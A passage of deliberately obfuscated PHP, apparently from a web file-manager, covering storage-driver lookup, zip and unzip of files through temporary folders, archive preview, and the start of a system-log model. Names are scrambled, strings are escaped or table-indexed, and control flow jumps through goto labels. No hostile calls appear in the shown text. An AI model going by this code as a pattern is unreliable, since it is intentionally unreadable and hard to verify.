($BŒš”ø–„[$bŒÙ¨¶‰[77]] == 0) { if (!isset($c”òîáé‹œ[$F»†±Éç²]) || $c”òîáé‹œ[$F»†±Éç²][$bŒÙ¨¶‰[78]] != $BŒš”ø–„[$bŒÙ¨¶‰[78]]) { $eâÊæ‰§Î[] = array($bŒÙ¨¶‰[755] => $BŒš”ø–„[$bŒÙ¨¶‰[76]], $bŒÙ¨¶‰[756] => $BÊ‘ ÖóŠ½ . $bŒÙ¨¶‰[8] . get_path_father($F»†±Éç²), $bŒÙ¨¶‰[757] => $BŒš”ø–„); if (isset($c”òîáé‹œ[$F»†±Éç²])) { IO::remove($BÊ‘ ÖóŠ½ . $bŒÙ¨¶‰[8] . $F»†±Éç²); } } } } $e§‰ã®Ü‰ = array($bŒÙ¨¶‰[164] => $eâÊæ‰§Î, $bŒÙ¨¶‰[77] => $B¼½ßóƒ‡Ù); goto cªŞ¦ó“å—; bÁŸô–‰˜: $AÑˆòõõÈ® = self::_listAll($côÑ¨øÂ‚Õ); $c”òîáé‹œ = self::_listAll($BÊ‘ ÖóŠ½); $eâÊæ‰§Î = array(); goto bÙ‰Ò“õ—; dç¢áÓğ¬Ç: } private static function _listAll($còÖï®¹×½) { $fŸ±¬øíµÈ =& $_SERVER[İë¬“ÅÒÛ›]; $còÖï®¹×½ = KodIO::clear($còÖï®¹×½); $bëÍï‡Ÿ…Ù = IO::listAll($còÖï®¹×½); foreach ($bëÍï‡Ÿ…Ù as &$D‚ã­Ëš¼Û) { $A÷Œ²«ËÜÎ = substr($D‚ã­Ëš¼Û[$fŸ±¬øíµÈ[76]], strlen($còÖï®¹×½)); $D‚ã­Ëš¼Û[$fŸ±¬øíµÈ[759]] = trim($A÷Œ²«ËÜÎ, $fŸ±¬øíµÈ[8]); } return array_to_keyvalue($bëÍï‡Ÿ…Ù, $fŸ±¬øíµÈ[759]); } private static function driverMake(&$eº²ùÚè¿‘) { goto FÈÛ½ÛªØË; aã™¸äÂµ·: return $fêé˜‰êâš; goto bòÅ¶‰Ú; E‹Ğ«á­¾ö: if ($CÀ•­óÚ [$cÑÍÙ¥‰¿[29]] == KodIO::KOD_IO && !self::$driverListSystem[$CÀ•­óÚ [$cÑÍÙ¥‰¿[369]]]) { return !1; } $eº²ùÚè¿‘ = $CÀ•­óÚ [$cÑÍÙ¥‰¿[760]]; $fêé˜‰êâš = self::driverGet($CÀ•­óÚ , $eº²ùÚè¿‘); goto aã™¸äÂµ·; FÈÛ½ÛªØË: $cÑÍÙ¥‰¿ =& $_SERVER[İë¬“ÅÒÛ›]; $CÀ•­óÚ  = KodIO::parse($eº²ùÚè¿‘); if (!self::$driverListSystem) { $AÊ¾¾º£° = Model($cÑÍÙ¥‰¿[462])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($AÊ¾¾º£°, $cÑÍÙ¥‰¿[369]); } goto E‹Ğ«á­¾ö; bòÅ¶‰Ú: } private static function driverGet($BŸŸ‘Å, &$CÛ©ó³‚“ˆ) { goto BîÜ¢š½ßß; BîÜ¢š½ßß: $b‚ÄùÒåÕƒ =& $_SERVER[İë¬“ÅÒÛ›]; $a‡¶¾„¬¤ = $BŸŸ‘Å[$b‚ÄùÒåÕƒ[761]]; $aãÓ¹µÜñ = $BŸŸ‘Å[$b‚ÄùÒåÕƒ[369]]; goto bÒõ‚ï; féßŸŒ¯ïÜ: if (isset($e‹ã†ŠÔÏ‹[$b‚ÄùÒåÕƒ[6]][$b‚ÄùÒåÕƒ[773]])) { $fã¥Šçø×–->pathBase = rtrim($e‹ã†ŠÔÏ‹[$b‚ÄùÒåÕƒ[6]][$b‚ÄùÒåÕƒ[773]], $b‚ÄùÒåÕƒ[8]) . $b‚ÄùÒåÕƒ[8]; $CÛ©ó³‚“ˆ = $fã¥Šçø×–->pathBase . ltrim($CÛ©ó³‚“ˆ, $b‚ÄùÒåÕƒ[8]); } $CÛ©ó³‚“ˆ = $fã¥Šçø×–->getPath($CÛ©ó³‚“ˆ); if (isset($BŸŸ‘Å[$b‚ÄùÒåÕƒ[746]])) { $CÛ©ó³‚“ˆ = $BŸŸ‘Å[$b‚ÄùÒåÕƒ[746]]; } goto dÀÛÜÕ©Ò¸; bÒõ‚ï: switch ($BŸŸ‘Å[$b‚ÄùÒåÕƒ[29]]) { case KodIO::KOD_IO: $e‹ã†ŠÔÏ‹ = self::$driverListSystem[$aãÓ¹µÜñ]; break; case KodIO::KOD_SOURCE: $CÛ©ó³‚“ˆ = $aãÓ¹µÜñ . $CÛ©ó³‚“ˆ; $e‹ã†ŠÔÏ‹ = array($b‚ÄùÒåÕƒ[762] => $b‚ÄùÒåÕƒ[763], $b‚ÄùÒåÕƒ[6] => $BŸŸ‘Å); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $eİ§æŞäá  = $GLOBALS[$b‚ÄùÒåÕƒ[764]]; self::$driverListUser = array_to_keyvalue($eİ§æŞäá , $b‚ÄùÒåÕƒ[369]); } $e‹ã†ŠÔÏ‹ = self::$driverListUser[$aãÓ¹µÜñ]; break; case KodIO::KOD_SHARE_LINK: $e‹ã†ŠÔÏ‹ = array($b‚ÄùÒåÕƒ[762] => $b‚ÄùÒåÕƒ[765], $b‚ÄùÒåÕƒ[6] => $BŸŸ‘Å); $f™îÂÎÛ = Action($b‚ÄùÒåÕƒ[766])->sharePathInfo($BŸŸ‘Å[$b‚ÄùÒåÕƒ[76]]); $CÛ©ó³‚“ˆ = $f™îÂÎÛ[$b‚ÄùÒåÕƒ[375]]; if (!$f™îÂÎÛ[$b‚ÄùÒåÕƒ[375]]) { $d¸ÔÌ®±à = Model($b‚ÄùÒåÕƒ[419])->getInfo($f™îÂÎÛ[$b‚ÄùÒåÕƒ[420]]); $CÛ©ó³‚“ˆ = KodIO::clear($d¸ÔÌ®±à[$b‚ÄùÒåÕƒ[767]] . $BŸŸ‘Å[$b‚ÄùÒåÕƒ[760]]); $BŸŸ‘Å[$b‚ÄùÒåÕƒ[768]] = $d¸ÔÌ®±à; $BŸŸ‘Å[$b‚ÄùÒåÕƒ[746]] = $CÛ©ó³‚“ˆ; $e‹ã†ŠÔÏ‹ = array($b‚ÄùÒåÕƒ[762] => $b‚ÄùÒåÕƒ[769], $b‚ÄùÒåÕƒ[6] => $BŸŸ‘Å); } break; case KodIO::KOD_SHARE_ITEM: $e‹ã†ŠÔÏ‹ = array($b‚ÄùÒåÕƒ[762] => $b‚ÄùÒåÕƒ[770], $b‚ÄùÒåÕƒ[6] => $BŸŸ‘Å); $d¸ÔÌ®±à = Model($b‚ÄùÒåÕƒ[419])->getInfo($BŸŸ‘Å[$b‚ÄùÒåÕƒ[369]]); if ($d¸ÔÌ®±à[$b‚ÄùÒåÕƒ[375]] == $b‚ÄùÒåÕƒ[403]) { $CÛ©ó³‚“ˆ = KodIO::clear($d¸ÔÌ®±à[$b‚ÄùÒåÕƒ[767]] . $BŸŸ‘Å[$b‚ÄùÒåÕƒ[760]]); $BŸŸ‘Å[$b‚ÄùÒåÕƒ[768]] = $d¸ÔÌ®±à; $BŸŸ‘Å[$b‚ÄùÒåÕƒ[746]] = $CÛ©ó³‚“ˆ; $e‹ã†ŠÔÏ‹ = array($b‚ÄùÒåÕƒ[762] => $b‚ÄùÒåÕƒ[771], $b‚ÄùÒåÕƒ[6] => $BŸŸ‘Å); } break; default: $CÛ©ó³‚“ˆ = $BŸŸ‘Å[$b‚ÄùÒåÕƒ[76]]; $e‹ã†ŠÔÏ‹ = array($b‚ÄùÒåÕƒ[762] => $b‚ÄùÒåÕƒ[772]); break; } $cçÔÅ„š‡¿ = $BŸŸ‘Å[$b‚ÄùÒåÕƒ[76]]; if (!isset(self::$driverCache[$cçÔÅ„š‡¿])) { $EÁÓÅé®Ğò = $b‚ÄùÒåÕƒ[72] . self::driverType($e‹ã†ŠÔÏ‹[$b‚ÄùÒåÕƒ[89]]); if (!class_exists($EÁÓÅé®Ğò)) { show_json("{$EÁÓÅé®Ğò}\x20\x6e\157\x74\x20\x65\170\x69\x73\164\163\41", !1); } $aŒñ¥•Šè• = isset($e‹ã†ŠÔÏ‹[$b‚ÄùÒåÕƒ[6]]) ? $e‹ã†ŠÔÏ‹[$b‚ÄùÒåÕƒ[6]] : !1; self::$driverCache[$cçÔÅ„š‡¿] = new $EÁÓÅé®Ğò($aŒñ¥•Šè•); } goto fÜÇÖà½èÙ; fÜÇÖà½èÙ: $fã¥Šçø×– = self::$driverCache[$cçÔÅ„š‡¿]; $fã¥Šçø×–->pathDriver = $a‡¶¾„¬¤; $fã¥Šçø×–->pathBase = $b‚ÄùÒåÕƒ[33]; goto féßŸŒ¯ïÜ; dÀÛÜÕ©Ò¸: $fã¥Šçø×–->path = $CÛ©ó³‚“ˆ; return $fã¥Šçø×–; goto Bº“‚îè·ù; Bº“‚îè·ù: } private static function driverType($d×‹âÚÍ¹„) { $FÁ¨µÒ¾…ñ =& $_SERVER[İë¬“ÅÒÛ›]; $d×‹âÚÍ¹„ = strtolower($d×‹âÚÍ¹„); if ($d×‹âÚÍ¹„ == $FÁ¨µÒ¾…ñ[65]) { $d×‹âÚÍ¹„ = $FÁ¨µÒ¾…ñ[774]; } else { if (in_array($d×‹âÚÍ¹„, array($FÁ¨µÒ¾…ñ[102], $FÁ¨µÒ¾…ñ[58], $FÁ¨µÒ¾…ñ[775]))) { $d×‹âÚÍ¹„ = ucfirst($d×‹âÚÍ¹„); } else { $d×‹âÚÍ¹„ = strtoupper($d×‹âÚÍ¹„); } } return $d×‹âÚÍ¹„; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $cò®ÏÀÛâ; if (!$cò®ÏÀÛâ) { $eòµòõà» = IO::init($_SERVER[İë¬“ÅÒÛ›][8]); } return $eòµòõà»; } private static function iconvSystem($c†Å‰Òã—¸) { return self::local()->iconvSystem($c†Å‰Òã—¸); } private static function iconvApp($B·ñ‚ğ˜ˆ) { return self::local()->iconvApp($B·ñ‚ğ˜ˆ); } public static function zip($f©¬»„¬š“, $dÜ¤õ‡†‡ˆ = "\x7a\151\x70", $Bí¤‹‹ñåõ = '', $bÒ¶’‘øÚ° = REPEAT_RENAME) { goto F“ù†¦¨Ù³; fÎç®¾º´õ: $a¾Á¢Á‹ƒ = self::move($FõÔÃšØ¿å, $Bö¬‡Üƒ—ï, $bÒ¶’‘øÚ°); if (!$a¾Á¢Á‹ƒ) { del_dir($f¥Œ™è¬§è); show_json(LNG($FÓºİ‡èóÍ[779]), !1); } del_dir($f¥Œ™è¬§è); goto E‘˜–¬İ§; dÂÆğÚ›±±: if (count($a¼éä¦Ã¹±) > 1) { $AŠª‡Ûê’ = isset($EÈã±„«É[$FÓºİ‡èóÍ[777]]) ? $EÈã±„«É[$FÓºİ‡èóÍ[777]] : $EÈã±„«É[$FÓºİ‡èóÍ[76]]; $Aâ‘Ü¿Ï = get_path_this(get_path_father($AŠª‡Ûê’)); } $c‘ƒõîë¡œ = $f¥Œ™è¬§è; if (!$c‘ƒõîë¡œ) { $c‘ƒõîë¡œ = get_path_father($EÈã±„«É[$FÓºİ‡èóÍ[76]]); $a…¾·Î¬ÃÀ = IO::info($c‘ƒõîë¡œ); if (!$a…¾·Î¬ÃÀ[$FÓºİ‡èóÍ[189]]) { show_json(LNG($FÓºİ‡èóÍ[778]), !1); } } goto EèŸœñ¹ßÖ; E‘Üˆªªƒ‰: foreach ($a¼éä¦Ã¹± as $Cè‡‚‚§ => $cæÇä¼Ê) { $a¼éä¦Ã¹±[$Cè‡‚‚§] = self::iconvSystem($cæÇä¼Ê); } KodArchive::create($f¥Ğì°ƒÜù, $a¼éä¦Ã¹±); if (!IO::exist($FõÔÃšØ¿å)) { if ($f¥Œ™è¬§è) { del_dir($f¥Œ™è¬§è); } show_json(LNG($FÓºİ‡èóÍ[779]), !1); } goto Dî„ Ú¥³È; E‘˜–¬İ§: return $a¾Á¢Á‹ƒ; goto B°áÄŞ÷³„; Dî„ Ú¥³È: if ($Bí¤‹‹ñåõ || !$f¥Œ™è¬§è) { if ($f¥Œ™è¬§è && strstr($f¥Œ™è¬§è, TEMP_FILES)) { $b¨±šÒÑõÒ = $a¼éä¦Ã¹± = array(); recursion_dir($c‘ƒõîë¡œ, $b¨±šÒÑõÒ, $a¼éä¦Ã¹±, 0); foreach ($b¨±šÒÑõÒ as $Cæ¶¼Ç¦–‰) { del_dir($Cæ¶¼Ç¦–‰); } foreach ($a¼éä¦Ã¹± as $b·Î£èˆ¿) { if ($b·Î£èˆ¿ == $f¥Ğì°ƒÜù) { continue; } del_file($b·Î£èˆ¿); } } return $FõÔÃšØ¿å; } $Bö¬‡Üƒ—ï = self::pathFather($EÈã±„«É[$FÓºİ‡èóÍ[76]]); $Bö¬‡Üƒ—ï = $D°…­Š¦¨->getPathOuter($D°…­Š¦¨->iconvSystem($Bö¬‡Üƒ—ï)); goto fÎç®¾º´õ; F“ù†¦¨Ù³: $FÓºİ‡èóÍ =& $_SERVER[İë¬“ÅÒÛ›]; $D°…­Š¦¨ = self::init($f©¬»„¬š“[0][$FÓºİ‡èóÍ[76]]); $EÈã±„«É = self::info($f©¬»„¬š“[0][$FÓºİ‡èóÍ[76]]); goto FÙ™¾Ì¾ïÖ; EèŸœñ¹ßÖ: $FõÔÃšØ¿å = $c‘ƒõîë¡œ . $Aâ‘Ü¿Ï . $FÓºİ‡èóÍ[92] . $dÜ¤õ‡†‡ˆ; $FõÔÃšØ¿å = get_filename_auto($FõÔÃšØ¿å, $FÓºİ‡èóÍ[33], $bÒ¶’‘øÚ°); $f¥Ğì°ƒÜù = self::iconvSystem($FõÔÃšØ¿å); goto E‘Üˆªªƒ‰; FÙ™¾Ì¾ïÖ: $f¥Œ™è¬§è = !1; if (!$Bí¤‹‹ñåõ && $D°…­Š¦¨->getType() == $FÓºİ‡èóÍ[102]) { $a¼éä¦Ã¹± = self::zipFileList($f©¬»„¬š“); } else { $f¥Œ™è¬§è = $Bí¤‹‹ñåõ ? $Bí¤‹‹ñåõ : TEMP_FILES . $FÓºİ‡èóÍ[776] . time() . rand_string(5) . $FÓºİ‡èóÍ[8]; mk_dir($f¥Œ™è¬§è); $a¼éä¦Ã¹± = self::zipFileList($f©¬»„¬š“, $f¥Œ™è¬§è); } $Aâ‘Ü¿Ï = $EÈã±„«É[$FÓºİ‡èóÍ[28]]; goto dÂÆğÚ›±±; B°áÄŞ÷³„: } public static function unzip($B¹µ„ù‘›é, $c–™ˆè†— = "\162\x65\160\x6c\141\143\x65") { goto Fä¤•ÇªÙ; e§ÃÏªèëÑ: mk_dir($E„íöÁ•); $B¢ìĞ®ÅÛ = $E„íöÁ• . $bõ‡Ì—…Ë¾[92] . $bÍÕ»ğÊ [$bõ‡Ì—…Ë¾[157]]; if (!@file_exists(self::iconvSystem($B¢ìĞ®ÅÛ))) { $c«¡éÇÓ· = self::localFilePath($cÄÉ®ˆ¹øÌ, $bÍÕ»ğÊ [$bõ‡Ì—…Ë¾[157]]); $B¢ìĞ®ÅÛ = $c«¡éÇÓ· ? $c«¡éÇÓ· : parent::download($cÄÉ®ˆ¹øÌ, $B¢ìĞ®ÅÛ); } goto CæÕÂ”ìÓ; d¬–ºŒ«ôã: $fÊÙß˜‹ñÃ = self::tmpFileName($bÍÕ»ğÊ ); $E„íöÁ• = TEMP_FILES . $fÊÙß˜‹ñÃ; del_dir($E„íöÁ•); goto e§ÃÏªèëÑ; D±Öå­¶¶: self::archiveExt(); if (!$aÖ„·¢·Ğõ[$bõ‡Ì—…Ë¾[784]]) { show_json($bõ‡Ì—…Ë¾[785] . $aÖ„·¢·Ğõ[$bõ‡Ì—…Ë¾[786]], !1); } Hook::trigger($bõ‡Ì—…Ë¾[787], $E„íöÁ•); goto F·¶½ã˜¤š; Fä¤•ÇªÙ: $bõ‡Ì—…Ë¾ =& $_SERVER[İë¬“ÅÒÛ›]; $cÄÉ®ˆ¹øÌ = $B¹µ„ù‘›é[$bõ‡Ì—…Ë¾[76]]; $CÕğÚãØšº = $B¹µ„ù‘›é[$bõ‡Ì—…Ë¾[780]]; goto Bõã ó–×“; fˆ¦ˆùßã‚: del_dir($E„íöÁ•); if (!$c«¡éÇÓ·) { del_file($B¢ìĞ®ÅÛ); } return !0; goto f‡÷Ë“ñŒã; CæÕÂ”ìÓ: $B¢ìĞ®ÅÛ = self::iconvSystem($B¢ìĞ®ÅÛ); $c¿Ì„Á˜‘ = isset($B¹µ„ù‘›é[$bõ‡Ì—…Ë¾[782]]) ? $B¹µ„ù‘›é[$bõ‡Ì—…Ë¾[782]] : $bõ‡Ì—…Ë¾[783]; $aÖ„·¢·Ğõ = KodArchive::extract($B¢ìĞ®ÅÛ, $E„íöÁ• . $bõ‡Ì—…Ë¾[8], $c¿Ì„Á˜‘); goto D±Öå­¶¶; F·¶½ã˜¤š: recursion_dir($E„íöÁ•, $bÕº×†­èî, $Fµ½…¿™¦À, 0); $f­°ç‰º† = array_merge($bÕº×†­èî, $Fµ½…¿™¦À); foreach ($f­°ç‰º† as $EÔ£òº´ªš) { $EÔ£òº´ªš = self::iconvApp($EÔ£òº´ªš); self::move($EÔ£òº´ªš, $CÕğÚãØšº, $c–™ˆè†—); } goto fˆ¦ˆùßã‚; Bõã ó–×“: if (!($bÍÕ»ğÊ  = parent::info($cÄÉ®ˆ¹øÌ))) { show_json(LNG($bõ‡Ì—…Ë¾[781]), !1); } if (!($A¬÷â‹Äøê = parent::infoFull($CÕğÚãØšº))) { $CÕğÚãØšº = parent::mkdir($CÕğÚãØšº); $A¬÷â‹Äøê = array($bõ‡Ì—…Ë¾[76] => $CÕğÚãØšº); } else { if (isset($A¬÷â‹Äøê[$bõ‡Ì—…Ë¾[375]]) && trim($A¬÷â‹Äøê[$bõ‡Ì—…Ë¾[76]], $bõ‡Ì—…Ë¾[8]) != trim($CÕğÚãØšº, $bõ‡Ì—…Ë¾[8])) { $d¦½—Ùº­ = KodIO::make($A¬÷â‹Äøê[$bõ‡Ì—…Ë¾[385]]); $bô‡¯ÇÊÙ´ = parent::fileNameAuto($d¦½—Ùº­, $A¬÷â‹Äøê[$bõ‡Ì—…Ë¾[28]], REPEAT_RENAME_FOLDER, !0); $CÕğÚãØšº = parent::mkdir($d¦½—Ùº­ . $bô‡¯ÇÊÙ´); $A¬÷â‹Äøê = array($bõ‡Ì—…Ë¾[76] => $CÕğÚãØšº); } } $CÕğÚãØšº = $A¬÷â‹Äøê[$bõ‡Ì—…Ë¾[76]]; goto d¬–ºŒ«ôã; f‡÷Ë“ñŒã: } public function unzipList($D±œ¬³Âµ£) { goto Eà£ƒİİî; bø’É¬Õ»¦: if ($dÕá°„˜Û¢ == -1) { $DÚÎ§õËò— = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\x56\x69\x65\167\57{$B‘–½È·¡}\57{$A¶í¯à‘Êö}\x2e\x6c\157\147"; $C®Ú‰×ÄëÎ = self::infoFull($DÚÎ§õËò—); if ($C®Ú‰×ÄëÎ) { $DÚÎ§õËò— = $C®Ú‰×ÄëÎ[$Aâ´¶†ùßå[76]]; $b§•ÏÑ² º = self::getContent($DÚÎ§õËò—); if ($b§•ÏÑ² º) { $eÅæ«¾ºÔ´ = json_decode($b§•ÏÑ² º, !0); if (count($eÅæ«¾ºÔ´) >= $f†„©Œ™¬è) { show_json(sprintf(LNG($Aâ´¶†ùßå[790]), count($eÅæ«¾ºÔ´)), !1); } return $eÅæ«¾ºÔ´; } } else { $DÚÎ§õËò— = self::mkfile($DÚÎ§õËò—); } } $BÛö‡—Ê‚Ë = TEMP_FILES . $B‘–½È·¡; if (!is_dir($BÛö‡—Ê‚Ë)) { mk_dir($BÛö‡—Ê‚Ë); } goto E•ÃÄß“¿¼; CÑß›¯àéµ: $dÌ›“ˆ¡· = self::info($FÍïĞº­İÑ); $B‘–½È·¡ = self::tmpFileName($dÌ›“ˆ¡·); if (isset($Bİ¬­¬—¨Ü)) { $F’æ°ÑŞªŒ = array($Bİ¬­¬—¨Ü[$Aâ´¶†ùßå[76]], $Bİ¬­¬—¨Ü[$Aâ´¶†ùßå[788]], $Bİ¬­¬—¨Ü[$Aâ´¶†ùßå[28]]); $A¶í¯à‘Êö = md5(implode($Aâ´¶†ùßå[71], $F’æ°ÑŞªŒ)) . $Aâ´¶†ùßå[92] . get_path_ext($Bİ¬­¬—¨Ü[$Aâ´¶†ùßå[28]]); } else { $F’æ°ÑŞªŒ = array($dÌ›“ˆ¡·[$Aâ´¶†ùßå[28]], $dÌ›“ˆ¡·[$Aâ´¶†ùßå[76]], $dÌ›“ˆ¡·[$Aâ´¶†ùßå[78]]); $A¶í¯à‘Êö = md5(implode($Aâ´¶†ùßå[71], $F’æ°ÑŞªŒ)) . $Aâ´¶†ùßå[92] . $dÌ›“ˆ¡·[$Aâ´¶†ùßå[157]]; } goto bø’É¬Õ»¦; Aˆ¬ÌÈ•ù„: if ($dÕá°„˜Û¢ >= 0) { $F¥öÆÍ¾® = isset($D±œ¬³Âµ£[$Aâ´¶†ùßå[792]]) ? $D±œ¬³Âµ£[$Aâ´¶†ùßå[792]] : !1; $F°Ëö¨ïİš = isset($D±œ¬³Âµ£[$Aâ´¶†ùßå[28]]) ? $D±œ¬³Âµ£[$Aâ´¶†ùßå[28]] : $Aâ´¶†ùßå[33]; KodArchive::filePreview($F³’âòìâ±, $dÕá°„˜Û¢, $F¥öÆÍ¾®, $F°Ëö¨ïİš); self::archiveExt(); die; } $Cìé…ºáèë = KodArchive::listContent($F³’âòìâ±); self::archiveExt(); goto cÙò‰âÅ‚¿; E•ÃÄß“¿¼: $F³’âòìâ± = $BÛö‡—Ê‚Ë . $Aâ´¶†ùßå[8] . $A¶í¯à‘Êö; if (!@file_exists(self::iconvSystem($F³’âòìâ±))) { if (isset($Bİ¬­¬—¨Ü)) { url_request($F‰¨¿åà¼, $Aâ´¶†ùßå[791], $F³’âòìâ±); } else { $C§­¡Å‰àé = self::localFilePath($F‰¨¿åà¼, $dÌ›“ˆ¡·[$Aâ´¶†ùßå[157]]); $F³’âòìâ± = $C§­¡Å‰àé ? $C§­¡Å‰àé : self::download($F‰¨¿åà¼, $F³’âòìâ±); } } $F³’âòìâ± = self::iconvSystem($F³’âòìâ±); goto Aˆ¬ÌÈ•ù„; cê¬ä½: self::setContent($DÚÎ§õËò—, $eÅæ«¾ºÔ´); if (count($Cìé…ºáèë[$Aâ´¶†ùßå[786]]) >= $f†„©Œ™¬è) { show_json(sprintf(LNG($Aâ´¶†ùßå[790]), count($Cìé…ºáèë[$Aâ´¶†ùßå[786]])), !1); } return $Cìé…ºáèë[$Aâ´¶†ùßå[786]]; goto E®µÖÊ¨Æ²; cÙò‰âÅ‚¿: del_dir($BÛö‡—Ê‚Ë); if (!$Cìé…ºáèë[$Aâ´¶†ùßå[784]]) { show_json($Cìé…ºáèë[$Aâ´¶†ùßå[786]], !1); } $eÅæ«¾ºÔ´ = json_encode($Cìé…ºáèë[$Aâ´¶†ùßå[786]]); goto cê¬ä½; Eà£ƒİİî: $Aâ´¶†ùßå =& $_SERVER[İë¬“ÅÒÛ›]; $F‰¨¿åà¼ = $D±œ¬³Âµ£[$Aâ´¶†ùßå[76]]; $dÕá°„˜Û¢ = isset($D±œ¬³Âµ£[$Aâ´¶†ùßå[788]]) ? $D±œ¬³Âµ£[$Aâ´¶†ùßå[788]] : -1; goto B¬÷Ìí¢‚ß; B¬÷Ìí¢‚ß: $f†„©Œ™¬è = 50000; if (request_url_safe($F‰¨¿åà¼)) { $Bİ¬­¬—¨Ü = parse_url_query($F‰¨¿åà¼); if (!isset($Bİ¬­¬—¨Ü[$Aâ´¶†ùßå[76]])) { show_json($Aâ´¶†ùßå[789], !1); } } $FÍïĞº­İÑ = isset($Bİ¬­¬—¨Ü) ? $Bİ¬­¬—¨Ü[$Aâ´¶†ùßå[76]] : $F‰¨¿åà¼; goto CÑß›¯àéµ; E®µÖÊ¨Æ²: } private function zipFileList($d¹Ï©ø¥Ú, $a¢‘Š…›ãğ = false) { $fÒÎĞ¯Ùé³ =& $_SERVER[İë¬“ÅÒÛ›]; $A»À›ö¼¤ê = array(); foreach ($d¹Ï©ø¥Ú as $EŒÚæï½ä) { $c–Šïˆ„£ª = $EŒÚæï½ä[$fÒÎĞ¯Ùé³[76]]; if ($a¢‘Š…›ãğ) { $c–Šïˆ„£ª = self::copy($EŒÚæï½ä[$fÒÎĞ¯Ùé³[76]], $a¢‘Š…›ãğ, $fÒÎĞ¯Ùé³[513]); } if ($c–Šïˆ„£ª && self::local()->exist($c–Šïˆ„£ª)) { $A»À›ö¼¤ê[$EŒÚæï½ä[$fÒÎĞ¯Ùé³[76]]] = $c–Šïˆ„£ª; } } if (!empty($A»À›ö¼¤ê)) { return array_values($A»À›ö¼¤ê); } show_json(LNG($fÒÎĞ¯Ùé³[793]), !1); } public static function tmpFileName($F†Ş‡™’ö) { $D¡Á¨”ÍÅË =& $_SERVER[İë¬“ÅÒÛ›]; $A±Æê™æ‘‹ = array($F†Ş‡™’ö[$D¡Á¨”ÍÅË[28]], $F†Ş‡™’ö[$D¡Á¨”ÍÅË[76]], $F†Ş‡™’ö[$D¡Á¨”ÍÅË[78]], $F†Ş‡™’ö[$D¡Á¨”ÍÅË[374]]); return md5(implode($D¡Á¨”ÍÅË[71], $A±Æê™æ‘‹)); } private function localFilePath($eÉÉŒÍ´½Æ, $a—øâÒ„‘) { goto DªÚ‘åÆˆİ; DªÚ‘åÆˆİ: $EÚ´ïËé¸® =& $_SERVER[İë¬“ÅÒÛ›]; $AÊ–¤à•‹ = KodIO::parse($eÉÉŒÍ´½Æ); if ($AÊ–¤à•‹[$EÚ´ïËé¸®[29]] == KodIO::KOD_SOURCE) { $E¸¼¸Š °ğ = Model($EÚ´ïËé¸®[522])->fileInfoGet(KodIO::sourceID($eÉÉŒÍ´½Æ)); if (!$E¸¼¸Š °ğ[$EÚ´ïËé¸®[76]]) { show_json($EÚ´ïËé¸®[794], !1); } $eÉÉŒÍ´½Æ = $E¸¼¸Š °ğ[$EÚ´ïËé¸®[76]]; } goto eÜåÌê‡‹°; CÇ²À”Øƒë: if ($CÑìˆ¨ß != $EÚ´ïËé¸®[102] || $a—øâÒ„‘ == $EÚ´ïËé¸®[796] && $BÆÅÑê’éİ) { return !1; } if (!$BĞÄõÖ±šÇ->exist($BĞÄõÖ±šÇ->path)) { show_json(LNG($EÚ´ïËé¸®[101]), !1); } self::archiveExt($a—øâÒ„‘); goto FèµÌ…Âï; FèµÌ…Âï: return $BĞÄõÖ±šÇ->path; goto b£ó¸Ì ­; eÜåÌê‡‹°: $BĞÄõÖ±šÇ = self::init($eÉÉŒÍ´½Æ); $CÑìˆ¨ß = $BĞÄõÖ±šÇ->getType(); $BÆÅÑê’éİ = strtoupper(substr(PHP_OS, 0, 3)) == $EÚ´ïËé¸®[795]; goto CÇ²À”Øƒë; b£ó¸Ì ­: } private function archiveExt($aÅïçŒŸæ = '') { $GLOBALS[$_SERVER[İë¬“ÅÒÛ›][797]] = $aÅïçŒŸæ; } } goto DÂêêª©â; aâù˜İÀã: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\155\137\154\x6f\147"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\124\151\x6d\x65", "\x74\x69\155\x65", "\151\156\163\145\x72\164", "\x66\165\156\143\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $e§±ßÔäù =& $_SERVER[İë¬“ÅÒÛ›]; return array($e§±ßÔäù[1807] => LNG($e§±ßÔäù[1808]), $e§±ßÔäù[1809] => LNG($e§±ßÔäù[1810]), $e§±ßÔäù[1486] => LNG($e§±ßÔäù[1811]), $e§±ßÔäù[1812] => LNG($e§±ßÔäù[1813]), $e§±ßÔäù[1814] => LNG($e§±ßÔäù[1815]), $e§±ßÔäù[1816] => LNG($e§±ßÔäù[1817]), $e§±ßÔäù[1818] => LNG($e§±ßÔäù[1819]), $e§±ßÔäù[1820] => LNG($e§±ßÔäù[1821]), $e§±ßÔäù[1518] => LNG($e§±ßÔäù[1822]), $e§±ßÔäù[1823] => LNG($e§±ßÔäù[1824]), $e§±ßÔäù[1825] => LNG($e§±ßÔäù[1826]), $e§±ßÔäù[1827] => LNG($e§±ßÔäù[1828]), $e§±ßÔäù[1829] => LNG($e§±ßÔäù[1830]), $e§±ßÔäù[1516] => LNG($e§±ßÔäù[1831]), $e§±ßÔäù[1521] => LNG($e§±ßÔäù[1832]), $e§±ßÔäù[1833] => LNG($e§±ßÔäù[1834]), $e§±ßÔäù[1835] => LNG($e§±ßÔäù[1836]), $e§±ßÔäù[1837] => LNG($e§±ßÔäù[1838]), $e§±ßÔäù[1839] => LNG($e§±ßÔäù[1840]), $e§±ßÔäù[1524] => LNG($e§±ßÔäù[1841]), $e§±ßÔäù[1525] => LNG($e§±ßÔäù[1842]), $e§±ßÔäù[1843] => LNG($e§±ßÔäù[1844]), $e§±ßÔäù[1845] => LNG($e§±ßÔäù[1846]), $e§±ßÔäù[1847] => LNG($e§±ßÔäù[1848]), $e§±ßÔäù[1849] => LNG($e§±ßÔäù[1850]), $e§±ßÔäù[1851] => LNG($e§±ßÔäù[1852]), $e§±ßÔäù[1519] => LNG($e§±ßÔäù[1853]), $e§±ßÔäù[1854] => LNG($e§±ßÔäù[1855]), $e§±ßÔäù[1856] => LNG($e§±ßÔäù[1857]), $e§±ßÔäù[1858] => LNG($e§±ßÔäù[1858]), $e§±ßÔäù[1859] => LNG($e§±ßÔäù[1490]), $e§±ßÔäù[1860] => LNG($e§±ßÔäù[1861]), $e§±ßÔäù[1862] => LNG($e§±ßÔäù[1863]), $e§±ßÔäù[1864] => LNG($e§±ßÔäù[1865]), 